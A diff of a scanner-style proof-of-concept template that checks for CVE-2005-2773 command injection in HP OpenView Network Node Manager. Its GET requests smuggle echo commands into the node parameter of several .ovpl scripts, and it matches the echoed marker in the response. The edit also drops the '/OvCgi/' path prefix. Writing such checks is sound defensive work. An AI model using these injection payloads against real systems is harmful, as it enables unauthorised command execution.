@@ -3,8 +3,8 @@ id = "POC-AVE-2005-0001"
 name = "HP OpenView Network Node Manager 远程命令执行 PoC"
 author = "AVE"
 severity = "critical"
-tags = ["cve-2005-2773", "command-injection", "rce"]
-description = "HP OpenView Network Node Manager OvCgi 脚本存在命令注入漏洞，通过向 node 参数注入管道符可执行任意系统命令"
+tags = ["rce", "command-injection", "cwe-77"]
+description = "HP OpenView Network Node Manager 6.2-7.50 中多个 .ovpl 脚本的 node 参数存在命令注入漏洞，远程攻击者可通过 shell 元字符执行任意命令。"
 vuln_id = ["CVE-2005-2773", "AVE-2005-0001"]
 
 [poc]
@@ -12,13 +12,9 @@ logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/OvCgi/connectedNodes.ovpl"
-
-[poc.requests.headers]
-Host = "{{Hostname}}"
-
-[poc.requests.query]
-node = ";echo;AVEPOCEV0"
+path = "/connectedNodes.ovpl"
+query.node = "127.0.0.1|echo%20AVE_TEST"
+headers.Connection = "close"
 
 [[poc.requests.matchers]]
 type = "status"
@@ -28,18 +24,14 @@ expect = true
 [[poc.requests.matchers]]
 type = "word"
 part = "body"
-words = ["AVEPOCEV0"]
+words = ["AVE_TEST"]
 expect = true
 
 [[poc.requests]]
 method = "GET"
-path = "/OvCgi/connectedNodes.ovpl"
-
-[poc.requests.headers]
-Host = "{{Hostname}}"
-
-[poc.requests.query]
-node = "|echo;AVEPOCEV1|"
+path = "/cdpView.ovpl"
+query.node = "127.0.0.1|echo%20AVE_TEST"
+headers.Connection = "close"
 
 [[poc.requests.matchers]]
 type = "status"
@@ -49,18 +41,14 @@ expect = true
 [[poc.requests.matchers]]
 type = "word"
 part = "body"
-words = ["AVEPOCEV1"]
+words = ["AVE_TEST"]
 expect = true
 
 [[poc.requests]]
 method = "GET"
-path = "/OvCgi/cdpView.ovpl"
-
-[poc.requests.headers]
-Host = "{{Hostname}}"
-
-[poc.requests.query]
-node = ";echo;AVEPOCEV2"
+path = "/freeIPaddrs.ovpl"
+query.node = "127.0.0.1|echo%20AVE_TEST"
+headers.Connection = "close"
 
 [[poc.requests.matchers]]
 type = "status"
@@ -70,18 +58,14 @@ expect = true
 [[poc.requests.matchers]]
 type = "word"
 part = "body"
-words = ["AVEPOCEV2"]
+words = ["AVE_TEST"]
 expect = true
 
 [[poc.requests]]
 method = "GET"
-path = "/OvCgi/freeIPaddrs.ovpl"
-
-[poc.requests.headers]
-Host = "{{Hostname}}"
-
-[poc.requests.query]
-node = ";echo;AVEPOCEV3"
+path = "/ecscmg.ovpl"
+query.node = "127.0.0.1|echo%20AVE_TEST"
+headers.Connection = "close"
 
 [[poc.requests.matchers]]
 type = "status"
@@ -91,26 +75,5 @@ expect = true
 [[poc.requests.matchers]]
 type = "word"
 part = "body"
-words = ["AVEPOCEV3"]
-expect = true
-
-[[poc.requests]]
-method = "GET"
-path = "/OvCgi/ecscmg.ovpl"
-
-[poc.requests.headers]
-Host = "{{Hostname}}"
-
-[poc.requests.query]
-node = ";echo;AVEPOCEV4"
-
-[[poc.requests.matchers]]
-type = "status"
-status = [200]
-expect = true
-
-[[poc.requests.matchers]]
-type = "word"
-part = "body"
-words = ["AVEPOCEV4"]
+words = ["AVE_TEST"]
 expect = true
